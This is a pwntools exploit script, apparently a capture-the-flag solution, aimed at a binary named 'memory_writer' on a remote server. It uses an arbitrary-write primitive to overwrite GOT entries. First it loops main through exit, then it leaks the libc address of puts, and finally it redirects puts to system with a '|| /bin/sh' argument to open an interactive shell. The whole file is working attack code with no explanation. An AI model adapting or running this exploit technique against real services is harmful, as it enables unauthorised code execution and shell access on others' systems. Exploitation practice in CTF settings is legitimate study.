from elftools.construct import lib
from pwn import *

BIN = './memory_writer'
# p = process(BIN)
p = remote('141.85.224.106', 31347)

elf = ELF(BIN)

# LIBC = '/lib/x86_64-linux-gnu/libc.so.6'
LIBC = './libc.so.6'
libc = ELF(LIBC)

def write_at_addr(p, name, addr, value, final=False):
	p.recvuntil(b'name:\n')
	p.sendline(name)

	p.readline()
	p.sendline(str(addr).encode())

	p.readline()
	p.sendline(str(value).encode())

	if final:
		p.recvline()
		p.interactive()
	else:
		p.recvuntil(b'value ')
		oldval = int(p.recvuntil(b' ')[:-1].decode())
		p.recvuntil(b'\n\n')
		return oldval

main = 0x4011f8

# Run `main` in a loop
write_at_addr(p, b'a', elf.got['exit'], main)

# Leak the address of `puts`
puts = write_at_addr(p, b'a', elf.got['puts'], elf.symbols['puts'] + 6)
libc.address = puts - libc.symbols['puts']

# Kill it (with love)!
write_at_addr(p, b'|| /bin/sh', elf.got['puts'], libc.symbols['system'], True)
